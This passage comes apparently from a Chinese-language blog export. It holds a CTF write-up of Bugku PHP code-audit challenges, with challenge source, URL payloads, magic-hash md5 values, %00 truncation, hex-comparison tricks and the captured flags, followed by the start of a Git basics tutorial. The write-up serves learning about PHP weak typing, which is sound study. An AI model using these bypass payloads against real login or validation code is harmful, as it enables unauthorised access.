<h3 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p><code>(md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;]))</code>判断是全等于，所以不可以用碰撞，可以用数组绕过。</p>
</li>
<li><p>构造payload：</p>
<p><a href="http://123.206.87.240:9009/18.php?username%5B%5D=1&amp;password%5B%5D=2">http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2</a></p>
</li>
</ol>
<h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><p>flag{bugk1u-ad8-3dsa-2}</p>
<h2 id="0x04md5加密相等绕过"><a href="#0x04md5加密相等绕过" class="headerlink" title="0x04md5加密相等绕过"></a>0x04md5加密相等绕过</h2><h3 id="题目地址-4"><a href="#题目地址-4" class="headerlink" title="题目地址"></a><a href="http://123.206.87.240:9009/13.php">题目地址</a></h3><h3 id="题目源码-4"><a href="#题目源码-4" class="headerlink" title="题目源码"></a>题目源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$md51 &#x3D; md5(&#39;QNKCDZO&#39;);</span><br><span class="line">$a &#x3D; @$_GET[&#39;a&#39;];</span><br><span class="line">$md52 &#x3D; @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">	if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123;</span><br><span class="line">		echo &quot;flag&#123;*&#125;&quot;;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &quot;false!!!&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	echo &quot;please input a&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-3"><a href="#writeup-3" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p><code>$md51 == $md52</code>不是全等于，用md5碰撞</p>
</li>
<li><p>构造payload：</p>
<p><a href="http://123.206.87.240:9009/13.php?a=240610708">http://123.206.87.240:9009/13.php?a=240610708</a></p>
</li>
</ol>
<h3 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h3><p>flag{bugku-dmsj-am9ls}</p>
<h3 id="md5碰撞样例"><a href="#md5碰撞样例" class="headerlink" title="md5碰撞样例"></a>md5碰撞样例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure>
<h2 id="0x05数组返回NULL绕过"><a href="#0x05数组返回NULL绕过" class="headerlink" title="0x05数组返回NULL绕过"></a>0x05数组返回NULL绕过</h2><h3 id="题目地址-5"><a href="#题目地址-5" class="headerlink" title="题目地址"></a><a href="http://123.206.87.240:9009/19.php">题目地址</a></h3><h3 id="题目源码-5"><a href="#题目源码-5" class="headerlink" title="题目源码"></a>题目源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">	if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">		echo &#39;You password must be alphanumeric&#39;;</span><br><span class="line">	else if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class="line">		die(&#39;Flag: &#39; . $flag);</span><br><span class="line">	else</span><br><span class="line">		echo &#39;Invalid password&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-4"><a href="#writeup-4" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p>题目提示很明显</p>
</li>
<li><p>数组构造payload：</p>
<p><a href="http://123.206.87.240:9009/19.php?password%5B%5D=1">http://123.206.87.240:9009/19.php?password[]=1</a></p>
</li>
</ol>
<h3 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h3><p>flag{ctf-bugku-ad-2131212}</p>
<h2 id="0x06弱类型整数大小比较绕过"><a href="#0x06弱类型整数大小比较绕过" class="headerlink" title="0x06弱类型整数大小比较绕过"></a>0x06弱类型整数大小比较绕过</h2><h3 id="题目地址-6"><a href="#题目地址-6" class="headerlink" title="题目地址"></a><a href="http://123.206.87.240:9009/22.php">题目地址</a></h3><h3 id="题目源码-6"><a href="#题目源码-6" class="headerlink" title="题目源码"></a>题目源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</span><br><span class="line">if($temp&gt;1336)&#123;</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-5"><a href="#writeup-5" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p>利用弱类型比较漏洞</p>
</li>
<li><p>is_numeric()判断是否为number类型,int float</p>
</li>
<li><p>构造payload：</p>
<p><a href="http://123.206.87.240:9009/22.php?password=1337a">http://123.206.87.240:9009/22.php?password=1337a</a></p>
</li>
</ol>
<h3 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h3><p>flag{bugku_null_numeric}</p>
<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><h3 id="题目地址-7"><a href="#题目地址-7" class="headerlink" title="题目地址"></a><a href="http://123.206.87.240:9009/20.php">题目地址</a></h3><h3 id="题目源码-7"><a href="#题目源码-7" class="headerlink" title="题目源码"></a>题目源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)&#123;</span><br><span class="line">	$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">	$one &#x3D; ord(&#39;1&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值</span><br><span class="line">	$nine &#x3D; ord(&#39;9&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值</span><br><span class="line">	$number &#x3D; &#39;3735929054&#39;;</span><br><span class="line">	&#x2F;&#x2F; Check all the input characters!</span><br><span class="line">	for ($i &#x3D; 0; $i &lt; strlen($number); $i++)&#123;</span><br><span class="line">		&#x2F;&#x2F; Disallow all the digits!</span><br><span class="line">		$digit &#x3D; ord($temp&#123;$i&#125;);</span><br><span class="line">		if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )&#123;&#x2F;&#x2F; Aha, digit not allowed!</span><br><span class="line">			return &quot;flase&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if($number &#x3D;&#x3D; $temp</span><br><span class="line">		return $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-6"><a href="#writeup-6" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p>利用弱类型比较漏洞,<code>==</code>会将数字自动转换为16进制</p>
</li>
<li><p>将3735929054转换为16进制加上控制字符0x</p>
</li>
<li><p>利用转换结果0xdeadc0de构造payload：</p>
<p><a href="http://123.206.87.240:9009/20.php?password=0xdeadc0de">http://123.206.87.240:9009/20.php?password=0xdeadc0de</a></p>
</li>
</ol>
<h3 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h3><p>flag{Bugku-admin-ctfdaimash}</p>
<h2 id="弱类型总结"><a href="#弱类型总结" class="headerlink" title="弱类型总结"></a>弱类型总结</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">2 var_dump(&quot;admin&quot;&#x3D;&#x3D;0);  &#x2F;&#x2F;true</span><br><span class="line">3 var_dump(&quot;1admin&quot;&#x3D;&#x3D;1); &#x2F;&#x2F;true</span><br><span class="line">4 var_dump(&quot;admin1&quot;&#x3D;&#x3D;1) &#x2F;&#x2F;false</span><br><span class="line">5 var_dump(&quot;admin1&quot;&#x3D;&#x3D;0) &#x2F;&#x2F;true</span><br><span class="line">6 var_dump(&quot;0e123456&quot;&#x3D;&#x3D;&quot;0e4456789&quot;); &#x2F;&#x2F;true </span><br><span class="line">7 ?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="判断松散性"><a href="#判断松散性" class="headerlink" title="==判断松散性"></a>==判断松散性</h4><ol>
<li>当一个字符串被当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内，该字符串被当作int来取值。其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</li>
<li>在进行比较运算时，如果遇到了0e这类字符串，PHP会将它解析为科学计数法。</li>
<li>在进行比较运算时，如果遇到了0x这类字符串，PHP会将它解析为十六进制。</li>
</ol>
<h4 id="函数松散性"><a href="#函数松散性" class="headerlink" title="函数松散性"></a>函数松散性</h4><ol>
<li><p><code>switch()</code></p>
<p>如果<code>switch</code>是<strong>数字类型</strong>的<code>case</code>的判断时，switch会将其中的参数转换为<code>int</code>类型。</p>
</li>
<li><p><code>in_array()</code></p>
<p><code>in_array(search,array,type)</code>: 如果给定的值 search 存在于数组 array 中则返回 true（<strong>类似于==**）。如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true（</strong>类似于===**）。如果没有在数组中找到参数，函数返回 false。</p>
</li>
<li><p><code>is_numeric</code>()</p>
<p><code>is_numeric</code>在做判断时候，如果攻击者把payload改成十六进制0x…，is_numeric会先对十六进制做类型判断，十六进制被判断为数字型为真，就进入了条件语句，如果再把这个代入进入sql语句进入mysql数据库，mysql数据库会对hex进行解析成字符串存入到数据库中，如果这个字段再被取出来二次利用，就可能造成二次注入漏洞。</p>
</li>
<li><p><code>strcmp</code>()</p>
<p><code>strcmp(string1，string2)</code>:比较括号内的两个字符串string1和string2，当他们两个相等时，返回0；string1的大于string2时，返回&gt;0;小于时返回&lt;0。在5.3及以后的php版本中，当strcmp()括号内是一个数组与字符串比较时，也会返回0。</p>
</li>
<li><p><code>md5</code>()</p>
<p><code>md5 ( string $str [, bool $raw_output = false ] )</code></p>
<p><code>md5()</code>需要是一个string类型的参数。但是当你传递一个array时，<code>md5()</code>不会报错，只是会无法正确地求出array的md5值，返回null，这样就会导致任意2个array的md5值都会相等。</p>
</li>
</ol>
<h2 id="0x08sha-函数比较绕过"><a href="#0x08sha-函数比较绕过" class="headerlink" title="0x08sha()函数比较绕过"></a>0x08sha()函数比较绕过</h2><h3 id="题目地址-8"><a href="#题目地址-8" class="headerlink" title="题目地址"></a><a href="http://123.206.87.240:9009/7.php">题目地址</a></h3><h3 id="题目源码-8"><a href="#题目源码-8" class="headerlink" title="题目源码"></a>题目源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;]))&#123;</span><br><span class="line">	var_dump($_GET[&#39;name&#39;]);</span><br><span class="line">	echo &quot;&quot;;</span><br><span class="line">	var_dump($_GET[&#39;password&#39;]);</span><br><span class="line">	var_dump(sha1($_GET[&#39;name&#39;]));</span><br><span class="line">	var_dump(sha1($_GET[&#39;password&#39;]));</span><br><span class="line">	if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class="line">		echo &#39;Your password can not be your name!&#39;;</span><br><span class="line">	else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;]))</span><br><span class="line">		die(&#39;Flag: &#39;.$flag);</span><br><span class="line">	else</span><br><span class="line">		echo &#39;Invalid password.&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">	echo &#39;Login first&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-7"><a href="#writeup-7" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p>数组绕过</p>
</li>
<li><p>构造payload：</p>
<p><a href="http://123.206.87.240:9009/7.php?name%5B%5D=1&amp;password%5B%5D=2">http://123.206.87.240:9009/7.php?name[]=1&amp;password[]=2</a></p>
</li>
</ol>
<h3 id="flag-8"><a href="#flag-8" class="headerlink" title="flag"></a>flag</h3><p>flag{bugku–daimasj-a2}</p>
<h2 id="0x09ereg正则-00截断"><a href="#0x09ereg正则-00截断" class="headerlink" title="0x09ereg正则%00截断"></a>0x09ereg正则%00截断</h2><h3 id="题目地址-9"><a href="#题目地址-9" class="headerlink" title="题目地址"></a><a href="http://123.206.87.240:9009/5.php">题目地址</a></h3><h3 id="题目源码-9"><a href="#题目源码-9" class="headerlink" title="题目源码"></a>题目源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;xxx&quot;;</span><br><span class="line">if (isset ($_GET[&#39;password&#39;]))&#123;</span><br><span class="line">	if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)&#123;</span><br><span class="line">		echo &#39;You password must be alphanumeric&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)&#123;</span><br><span class="line">		if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !&#x3D;&#x3D; FALSE)&#123;&#x2F;&#x2F;strpos — 查找字符串首次出现的位置</span><br><span class="line">			die(&#39;Flag: &#39; . $flag);</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			echo(&#39;have not been found&#39;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		echo &#39;Invalid password&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-8"><a href="#writeup-8" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p><code>if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)</code><br>password匹配必须 a-z A-Z 0-9 之中</p>
<p>这个可以用%00截断</p>
</li>
<li><p><code>if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)</code></p>
<p>password小于8位数 且 大于9999999</p>
</li>
<li><p><code>if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !== FALSE)</code></p>
<p>数组绕过同时也可以绕过这个</p>
</li>
<li><p>构造payload：</p>
<p>[<a href="http://123.206.87.240:9009/5.php?password%5B%5C%5D=0%00%5D(http://123.206.87.240:9009/5.php?password%5B%5D=0%00)">http://123.206.87.240:9009/5.php?password[\]=0%00](http://123.206.87.240:9009/5.php?password[]=0 )</a></p>
</li>
</ol>
<h3 id="flag-9"><a href="#flag-9" class="headerlink" title="flag"></a>flag</h3><p>flag{bugku-dm-sj-a12JH8}</p>
<h3 id="bug？？？"><a href="#bug？？？" class="headerlink" title="bug？？？"></a>bug？？？</h3><p>不知道为什么，构造payload:</p>
<p><a href="http://123.206.87.240:9009/5.php?password%5B%5D=">http://123.206.87.240:9009/5.php?password[]=</a></p>
<p>也可以，同理</p>
<p>[<a href="http://123.206.87.240:9009/5.php?password%5B%5C%5D=0%00%5D(http://123.206.87.240:9009/5.php?password%5B%5D=0%00)">http://123.206.87.240:9009/5.php?password[\]=0%00](http://123.206.87.240:9009/5.php?password[]=0 )</a></p>
<p>也可以。。。。。bug？？？就(⊙_⊙)？</p>
<h3 id="0x00截断与-00"><a href="#0x00截断与-00" class="headerlink" title="0x00截断与%00"></a>0x00截断与%00</h3><p>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。这个可以用在对文件类型名的绕过上。当然某些比较函数会当成结束符，从而达到绕过验证的效果。</p>
<h4 id="感觉讲解还可以的文章"><a href="#感觉讲解还可以的文章" class="headerlink" title="感觉讲解还可以的文章"></a>感觉讲解还可以的文章</h4><p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80545408">地址1</a></p>
<p><a href="http://blog.csdn.net/hitwangpeng/article/details/47042971">地址2</a></p>
<p><a href="http://www.2cto.com/article/201502/377462.html">地址3</a></p>
<p><a href="http://www.2cto.com/article/201110/108975.htm">地址4</a></p>
<p>建议自己实验一遍。</p>
<h2 id="0x10strpos数组绕过"><a href="#0x10strpos数组绕过" class="headerlink" title="0x10strpos数组绕过"></a>0x10strpos数组绕过</h2><h3 id="题目地址-10"><a href="#题目地址-10" class="headerlink" title="题目地址"></a><a href="http://123.206.87.240:9009/15.php">题目地址</a></h3><h3 id="题目源码-10"><a href="#题目源码-10" class="headerlink" title="题目源码"></a>题目源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset ($_GET[&#39;ctf&#39;])) &#123;</span><br><span class="line">	if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">		echo &#39;必须输入数字才行&#39;;</span><br><span class="line">	else if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class="line">		die(&#39;Flag: &#39;.$flag);</span><br><span class="line">	else</span><br><span class="line">		echo &#39;骚年，继续努力吧啊~&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-9"><a href="#writeup-9" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p><code>if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;])</code></p>
<p>必须输入数字</p>
</li>
<li><p><code>if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !== FALSE)</code></p>
<p>传过来的字符串要匹配一次<code>#biubiubiu</code></p>
</li>
<li><p>题目提示很明显，所以利用数组绕过</p>
</li>
<li><p>构造payload:</p>
<p><a href="http://123.206.87.240:9009/15.php?ctf%5B%5D=#biubiubiu">http://123.206.87.240:9009/15.php?ctf[]=#biubiubiu</a></p>
</li>
</ol>
<h3 id="flag-10"><a href="#flag-10" class="headerlink" title="flag"></a>flag</h3><p>flag{Bugku-D-M-S-J572}</p>
<h3 id="bug？？？-1"><a href="#bug？？？-1" class="headerlink" title="bug？？？"></a>bug？？？</h3><p>构造payload:</p>
<p><a href="http://123.206.87.240:9009/15.php?ctf%5B%5D=">http://123.206.87.240:9009/15.php?ctf[]=</a></p>
<p>也可以得到flag，bug？？？(⊙_⊙)？</p>
<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><h4 id="题目挂了"><a href="#题目挂了" class="headerlink" title="题目挂了"></a>题目挂了</h4><p>变量覆盖</p>
<p>简单的waf</p>
<h4 id="题目有严重bug"><a href="#题目有严重bug" class="headerlink" title="题目有严重bug"></a>题目有严重bug</h4><p>数字验证正则绕过</p>
<p>直接post一个password=就可以拿到flag</p>
<p>不过有个可能值得看看的文章</p>
<p><a href="https://foxgrin.github.io/posts/25617/">地址</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>代码审计是一项基本技能，就是看代码，找相关函数的验证漏洞，绕过验证，sql注入可以类比。</p>
<p>bugku的这几道代码审计题目质量其实不够高，但是他单独拎出来，说明这种能力很重要。看看，学习一些只是也是很好的，找到了flag，不要满足，继续审计一下，php官方文档是个好东西。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>php弱类型</tag>
      </tags>
  </entry>
  <entry>
    <title>Git基础教程</title>
    <url>/2018/11/20/Note/Git%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="Git基础教程"><a href="#Git基础教程" class="headerlink" title="Git基础教程"></a>Git基础教程</h1><p>Git 是一个分布式版本控制工具，最初由Linux之父Linus Torvalds创作，后托付滨野纯作为软件维护者。</p>
<p>详细历史见维基 <a href="https://zh.wikipedia.org/wiki/Git">git wiki</a></p>
<a id="more"></a>

<h2 id="Git的基本功能"><a href="#Git的基本功能" class="headerlink" title="Git的基本功能"></a>Git的基本功能</h2><p><a href="https://study-resources-1256288674.cos.ap-chengdu.myqcloud.com/Git-mindMapping.png"><img src="https://study-resources-1256288674.cos.ap-chengdu.myqcloud.com/Git-mindMapping.png" alt="Git脑图"></a></p>
<h3 id="项目管理"><a href="#项目管理" class="headerlink" title="项目管理"></a>项目管理</h3><h4 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>
<p>在项目根目录内使用此命令即将项目初始化为一个git仓库</p>
<h4 id="下载远程项目"><a href="#下载远程项目" class="headerlink" title="下载远程项目"></a>下载远程项目</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone [option] URL [dirname]</span><br></pre></td></tr></table></figure>
<ul>
<li><code>[dirname]</code> 设置新建目录的名字</li>
<li>option:<ul>
<li><code>-b &lt;branch&gt;</code> 克隆指定分支</li>
</ul>
</li>
</ul>
<h3 id="提交修改"><a href="#提交修改" class="headerlink" title="提交修改"></a>提交修改</h3><p>Git 有一个用于存储修改的暂存区，提交一次修改的过程首先需要添加文件到暂存区，然后再进行提交（commit），并填写提交记录</p>
<h4 id="跟踪文件-amp-amp-添加修改到暂存区"><a href="#跟踪文件-amp-amp-添加修改到暂存区" class="headerlink" title="跟踪文件 &amp;&amp; 添加修改到暂存区"></a>跟踪文件 &amp;&amp; 添加修改到暂存区</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add FILE</span><br></pre></td></tr></table></figure>
<ul>
<li><code>FILE</code> 需要添加到暂存区的文件，使用<code>.</code>来指代工作区全部文件</li>
</ul>
<p>第一次添加的文件在之前是未跟踪（untracked）的状态，使用命令后会跟踪文件并将文件添加到暂存区；</p>
<p>已存在但是发生了修改的文件会添加进暂存区。</p>
<h4 id="查看暂存区状态"><a href="#查看暂存区状态" class="headerlink" title="查看暂存区状态"></a>查看暂存区状态</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git status # 查看暂存区状态</span><br><span class="line">git diff # 查看工作区与暂存区的区别</span><br></pre></td></tr></table></figure>
<p>git diff若暂存区无修改则显示与当前版本的区别；也可使用<code>git diff --cached</code>来查看。</p>
<h4 id="提交暂存区到版本"><a href="#提交暂存区到版本" class="headerlink" title="提交暂存区到版本"></a>提交暂存区到版本</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git commit [options]</span><br></pre></td></tr></table></figure>
<p>options:</p>
<ul>
<li><code>-a</code> 提交全部未暂存的修改</li>
<li><code>-m MESSAGE</code> 使用短字符串作为提交记录，不适用此参数则会进入系统编辑器编写commit记录</li>
<li><code>--amend</code> 重新提交最近一次的修改记录</li>
</ul>
<h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><h4 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch [options] [NAME]</span><br></pre></td></tr></table></figure>
<p>options:</p>
<ul>
<li><code>-a</code> 显示所有分支（本地和远程）</li>
<li><code>-d</code> 删除分支（已合并）</li>
<li><code>-D</code> 强制删除分支</li>
<li><code>-v</code> 显示最近一次提交</li>
</ul>
<h4 id="检出分支"><a href="#检出分支" class="headerlink" title="检出分支"></a>检出分支</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout [options]</span><br></pre></td></tr></table></figure>
<p>检出到指定分支（切换分支），同时会撤销当前分支上未提交的所有修改（回退到当前分支的最新版本）</p>
<p>options:</p>
<ul>
<li><code>&lt;file&gt;</code> 撤销某个文件的修改</li>
<li><code>[branch_name]</code> 切换分支</li>
<li><code>-b [branch_name]</code>新建并切换分支</li>
<li><code>-b [branchname] [tagname]</code> 在特定标签下创建分支</li>
</ul>
<p>可以使用checkout来快速撤销当前分支所有修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout .</span><br></pre></td></tr></table></figure>
<h4 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git merge NAME # 将指定分支合并到当前分支</span><br></pre></td></tr></table></figure>
<h4 id="常用分支名称"><a href="#常用分支名称" class="headerlink" title="常用分支名称"></a>常用分支名称</h4><ul>
<li>master 主分支，稳定分支，默认分支</li>
<li>dev 开发版本分支</li>
<li>fix#4 修复问题时的临时分支</li>
</ul>
<h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><p>Git可以给历史中的某一个提交打上标签，以示重要</p>
<p>比较有代表性的是用来标记发表结点（版本号）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git tag # 列出标签</span><br><span class="line">git tag -l &#39;pattern&#39; # 用特定模式查找标签</span><br><span class="line">git show TAG # 查看标签信息与对应的提交信息</span><br></pre></td></tr></table></figure>
<p>git标签分为<strong>轻量标签</strong>和<strong>附注标签</strong>两种</p>
<h4 id="轻量标签"><a href="#轻量标签" class="headerlink" title="轻量标签"></a>轻量标签</h4><p>像一个不会改变的分支（branch）- 它只是一个特定提交的引用。</p>
<h4 id="附注标签"><a href="#附注标签" class="headerlink" title="附注标签"></a>附注标签</h4><p>是存储在Git数据库中的一个完整对象。</p>
<p>其中包含：</p>
<ul>
<li>标签者的名字</li>
<li>电子邮件地址</li>
<li>日期时间</li>
<li>标签信息</li>
</ul>
<p>它们可以使用GPG签名与验证</p>
<hr>
<p>通常建议创建附注标签（信息量大），但如果你只是想用一个临时的标签，，或者因为某些原因不要保存那些信息，就使用轻量标签</p>
<h4 id="创建标签"><a href="#创建标签" class="headerlink" title="创建标签"></a>创建标签</h4><p><code>git tag -a &lt;tagname&gt; -m &#39;comment&#39;</code> 创建一个附注标签</p>
<ul>
<li><code>-m</code> 选项指定了将会存储在标签中的信息，如果没有指定，git将会运行编辑器要求你输入信息</li>
</ul>
<p><code>git tag &lt;tagname&gt;</code> 创建一个轻量标签</p>
<p>不需要使用<code>-a</code>、<code>-s</code>或<code>-m</code>选项，只需要提供标签名字</p>
<p>为之前的提交补充标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git tag -a &lt;tagname&gt; &lt;id&gt;</span><br></pre></td></tr></table></figure>
<p>id为要补充标签的提交的校验和（或部分校验和）</p>
<h4 id="推送标签"><a href="#推送标签" class="headerlink" title="推送标签"></a>推送标签</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push &lt;remote&gt; &lt;tagname&gt;</span><br></pre></td></tr></table></figure>
<p>默认情况下，<code>git push</code>命令并不会推送标 签到远程仓库。在创建完标签后你必须显式地推送标签，过程和推送远程分支一样</p>
<p>如果想要一次推送很多标签，也可以使用带有<code>--tags</code>选项的<code>git push</code>命令。这将会把所有不在远程仓库的标签全部推送到远程仓库</p>
<h4 id="检出标签"><a href="#检出标签" class="headerlink" title="检出标签"></a>检出标签</h4><p>Git 中并不能真的检出一个标签，因为它们并不能像分支一样来回移动。如果你想要工作目录与仓库中特定的标签版本完全一样，可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b &lt;branchname&gt; &lt;tagname&gt;</span><br></pre></td></tr></table></figure>
<p>这将会在特定的标签上创建一个新分支</p>
<p>但是如果在这个分支上又进行了新提交，那么这个分支就会因为改动而向前移动导致和标签有所不同。</p>
<h3 id="远程管理"><a href="#远程管理" class="headerlink" title="远程管理"></a>远程管理</h3><h4 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remore add origin URL # 添加远程仓库为origin</span><br><span class="line">git remote rm origin # 删除远程仓库origin</span><br><span class="line"></span><br><span class="line">git branch -r # 查看远程仓库的分支</span><br></pre></td></tr></table></figure>
